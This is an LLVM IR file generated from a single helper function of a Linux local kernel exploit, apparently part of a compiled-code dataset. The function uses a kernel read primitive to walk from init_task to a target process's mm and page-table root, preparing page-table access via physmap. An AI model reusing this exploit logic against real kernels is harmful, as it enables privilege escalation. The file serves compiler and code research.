; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45175.c_pts_init.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45175.c_pts_init.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@g_kernel_text = common dso_local global i64 0, align 8
@O_INIT_TASK = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [30 x i8] c"[.] init_task:        %016lx\0A\00", align 1
@.str.1 = private unnamed_addr constant [30 x i8] c"[.] task:             %016lx\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"[-] task %d not found\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@PAGE_OFFSET_BASE = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [46 x i8] c"[-] task sanity check failed (wrong offset?)\0A\00", align 1
@O_TASK_STRUCT_MM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [30 x i8] c"[.] task->mm:         %016lx\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"[-] mm not found (kernel task?)\0A\00", align 1
@.str.6 = private unnamed_addr constant [44 x i8] c"[-] mm sanity check failed (wrong offset?)\0A\00", align 1
@O_MM_STRUCT_MMAP = common dso_local global i32 0, align 4
@g_mmap = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [30 x i8] c"[.] task->mm->mmap:   %016lx\0A\00", align 1
@.str.8 = private unnamed_addr constant [46 x i8] c"[-] mmap sanity check failed (wrong offset?)\0A\00", align 1
@O_INIT_MM = common dso_local global i64 0, align 8
@O_MM_STRUCT_PGD = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [30 x i8] c"[.] task->mm->pgd:    %016lx\0A\00", align 1
@.str.10 = private unnamed_addr constant [45 x i8] c"[-] pgd sanity check failed (wrong offset?)\0A\00", align 1
@g_ptsc = common dso_local global i32 0, align 4
@g_physmap = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i32)* @pts_init to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @pts_init(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %7 = load i32, i32* %2, align 4
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %71

9:                                                ; preds = %1
  %10 = load i64, i64* @g_kernel_text, align 8
  %11 = load i64, i64* @O_INIT_TASK, align 8
  %12 = add i64 %10, %11
  store i64 %12, i64* %4, align 8
  %13 = load i64, i64* %4, align 8
  %14 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i64 %13)
  %15 = load i64, i64* %4, align 8
  %16 = load i32, i32* %2, align 4
  %17 = call i64 @find_task_by_pid(i64 %15, i32 %16)
  store i64 %17, i64* %5, align 8
  %18 = load i64, i64* %5, align 8
  %19 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0), i64 %18)
  %20 = load i64, i64* %5, align 8
  %21 = icmp eq i64 %20, 0
  br i1 %21, label %22, label %27

22:                                               ; preds = %9
  %23 = load i32, i32* %2, align 4
  %24 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i32 %23)
  %25 = load i32, i32* @EXIT_FAILURE, align 4
  %26 = call i32 @exit(i32 %25) #3
  unreachable

27:                                               ; preds = %9
  %28 = load i64, i64* %5, align 8
  %29 = load i64, i64* @PAGE_OFFSET_BASE, align 8
  %30 = icmp ult i64 %28, %29
  br i1 %30, label %31, label %35

31:                                               ; preds = %27
  %32 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %33 = load i32, i32* @EXIT_FAILURE, align 4
  %34 = call i32 @exit(i32 %33) #3
  unreachable

35:                                               ; preds = %27
  br label %36

36:                                               ; preds = %35
  %37 = load i64, i64* %5, align 8
  %38 = load i32, i32* @O_TASK_STRUCT_MM, align 4
  %39 = call i64 @read_field_8(i64 %37, i32 %38)
  store i64 %39, i64* %3, align 8
  %40 = load i64, i64* %3, align 8
  %41 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0), i64 %40)
  %42 = load i64, i64* %3, align 8
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %44, label %48

44:                                               ; preds = %36
  %45 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  %47 = call i32 @exit(i32 %46) #3
  unreachable

48:                                               ; preds = %36
  %49 = load i64, i64* %3, align 8
  %50 = load i64, i64* @PAGE_OFFSET_BASE, align 8
  %51 = icmp ult i64 %49, %50
  br i1 %51, label %52, label %56

52:                                               ; preds = %48
  %53 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.6, i64 0, i64 0))
  %54 = load i32, i32* @EXIT_FAILURE, align 4
  %55 = call i32 @exit(i32 %54) #3
  unreachable

56:                                               ; preds = %48
  br label %57

57:                                               ; preds = %56
  %58 = load i64, i64* %3, align 8
  %59 = load i32, i32* @O_MM_STRUCT_MMAP, align 4
  %60 = call i64 @read_field_8(i64 %58, i32 %59)
  store i64 %60, i64* @g_mmap, align 8
  %61 = load i64, i64* @g_mmap, align 8
  %62 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0), i64 %61)
  %63 = load i64, i64* @g_mmap, align 8
  %64 = load i64, i64* @PAGE_OFFSET_BASE, align 8
  %65 = icmp ult i64 %63, %64
  br i1 %65, label %66, label %70

66:                                               ; preds = %57
  %67 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.8, i64 0, i64 0))
  %68 = load i32, i32* @EXIT_FAILURE, align 4
  %69 = call i32 @exit(i32 %68) #3
  unreachable

70:                                               ; preds = %57
  br label %75

71:                                               ; preds = %1
  %72 = load i64, i64* @g_kernel_text, align 8
  %73 = load i64, i64* @O_INIT_MM, align 8
  %74 = add i64 %72, %73
  store i64 %74, i64* %3, align 8
  br label %75

75:                                               ; preds = %71, %70
  %76 = load i64, i64* %3, align 8
  %77 = load i32, i32* @O_MM_STRUCT_PGD, align 4
  %78 = call i64 @read_field_8(i64 %76, i32 %77)
  store i64 %78, i64* %6, align 8
  %79 = load i64, i64* %6, align 8
  %80 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.9, i64 0, i64 0), i64 %79)
  %81 = load i64, i64* %6, align 8
  %82 = load i64, i64* @PAGE_OFFSET_BASE, align 8
  %83 = icmp ult i64 %81, %82
  br i1 %83, label %84, label %88

84:                                               ; preds = %75
  %85 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.10, i64 0, i64 0))
  %86 = load i32, i32* @EXIT_FAILURE, align 4
  %87 = call i32 @exit(i32 %86) #3
  unreachable

88:                                               ; preds = %75
  %89 = load i32, i32* @g_physmap, align 4
  %90 = load i64, i64* %6, align 8
  %91 = call i32 @ptsc_init(i32* @g_ptsc, i32 %89, i64 %90)
  ret void
}

declare dso_local i32 @info(i8*, ...) #1

declare dso_local i64 @find_task_by_pid(i64, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @read_field_8(i64, i32) #1

declare dso_local i32 @ptsc_init(i32*, i32, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
